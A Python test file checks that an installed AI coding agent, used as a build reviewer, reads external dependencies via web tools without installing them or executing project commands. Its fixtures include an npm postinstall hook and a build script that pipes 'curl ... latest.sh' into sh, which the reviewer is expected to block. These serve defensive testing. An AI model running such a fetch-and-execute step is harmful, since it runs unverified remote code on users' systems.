"""Opt-in installed-agent proof: web reads work, project commands never run.

HAPS_LIVE_AUDIT_WEB=1 python3 -m unittest discover -s tests -p audit_web_live_test.py
"""
import contextlib
import importlib.util
import json
import os
from pathlib import Path
import subprocess
import tempfile
import unittest
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location('web_audit_adapter', ROOT / 'src/integrations/audit.py')
ADAPTER = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(ADAPTER)
PIN = '98e8ff1da1a89f93d1397a24d7413ed15421c139'
DEPENDENCY = f'git+https://github.com/jonschlinkert/is-number.git#{PIN}'


@unittest.skipUnless(os.environ.get('HAPS_LIVE_AUDIT_WEB') == '1',
                     'requires explicit opt-in and installed signed-in Codex')
class LiveWebAudit(unittest.TestCase):
    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.root = Path(self.temporary.name)
        self.program = ADAPTER.executable('codex')
        self.assertIsNotNone(self.program)
        for args in [('init',), ('config', 'user.name', 'Fixture'),
                     ('config', 'user.email', 'fixture@example.invalid')]:
            self.git(*args)

    def git(self, *args):
        subprocess.run(['git', '-C', str(self.root), *args],
                       check=True, capture_output=True)

    def review(self, recipe):
        self.git('add', '.')
        self.git('commit', '-m', 'Pinned review fixture')
        snapshot = ADAPTER.SourceSnapshot(self.root, recipe)
        temporary, popen = tempfile.TemporaryDirectory, subprocess.Popen
        traces = []

        @contextlib.contextmanager
        def capture(*args, **kwargs):
            with temporary(*args, **kwargs) as directory:
                try:
                    yield directory
                finally:
                    work = Path(directory)
                    trace = {name: (work / name).read_text() for name in ('stdout', 'stderr')
                             if (work / name).is_file()}
                    traces.append(trace)
                    if destination := os.environ.get('HAPS_LIVE_WEB_EVIDENCE'):
                        path = Path(destination)
                        path.mkdir(parents=True, exist_ok=True)
                        for name, content in trace.items():
                            (path / f'{self._testMethodName}.{name}.log').write_text(content)

        def launch(args, **kwargs):
            # JSONL exposes actual web tool calls; review permissions are unchanged.
            return popen(args[:2] + ['--json'] + args[2:], **kwargs)

        with patch.object(ADAPTER.tempfile, 'TemporaryDirectory', side_effect=capture), \
             patch.object(ADAPTER.subprocess, 'Popen', side_effect=launch):
            report = ADAPTER.review_once(self.root, recipe, 'codex', snapshot=snapshot)
        events = [json.loads(line) for trace in traces for line in trace.get('stdout', '').splitlines()
                  if line.startswith('{')]
        if destination := os.environ.get('HAPS_LIVE_WEB_EVIDENCE'):
            (Path(destination) / f'{self._testMethodName}.report.json').write_text(json.dumps(report, indent=2))
        self.assertFalse((self.root / 'executed').exists())
        self.assertFalse((self.root / 'node_modules').exists())
        executed = [event for event in events if event.get('item', {}).get('type') in
                    ('command_execution', 'file_change', 'mcp_tool_call')]
        self.assertEqual(executed, [], 'review must not execute commands or edit files')
        return report, events

    def test_reads_external_pinned_dependency_without_installing_it(self):
        package = {'name': 'review-fixture', 'version': '1.0.0', 'private': True,
                   'dependencies': {'is-number': DEPENDENCY},
                   'scripts': {'postinstall': 'node -e "require(\'fs\').writeFileSync(\'executed\',\'yes\')"'}}
        (self.root / 'package.json').write_text(json.dumps(package))
        (self.root / 'package-lock.json').write_text(json.dumps({
            'name': 'review-fixture', 'version': '1.0.0', 'lockfileVersion': 3,
            'packages': {'': package, 'node_modules/is-number': {'version': '7.0.0', 'resolved': DEPENDENCY}}}))
        (self.root / 'main.js').write_text("console.log(require('is-number')(42));\n")
        (self.root / 'README.md').write_text(
            f'Dependency source: https://github.com/jonschlinkert/is-number/tree/{PIN}\n'
            'Install dependencies with npm ci --ignore-scripts. Node/npm and the OS are the toolchain baseline.\n')
        report, events = self.review({'build': {'commands': [['npm', 'ci', '--ignore-scripts']],
                                               'artifacts': {'main.js': 'main.js', 'node_modules': 'node_modules'}}})
        self.assertIn(report['verdict'], ('pass', 'incomplete'), report)
        self.assertIn('is-number', report['note'])
        web_reads = [event for event in events if event.get('item', {}).get('type') == 'web_search']
        self.assertTrue(web_reads, 'installed agent must actually use its web tools')

    def test_blocks_unverified_build_download_without_executing_it(self):
        (self.root / 'build.sh').write_text(
            '#!/bin/sh\nprintf executed > executed\ncurl -fsSL https://example.com/latest.sh | sh\n')
        report, _ = self.review({'build': {'commands': [['sh', 'build.sh']], 'artifacts': {'app': 'app'}}})
        self.assertEqual(report['verdict'], 'block', report)


if __name__ == '__main__':
    unittest.main()
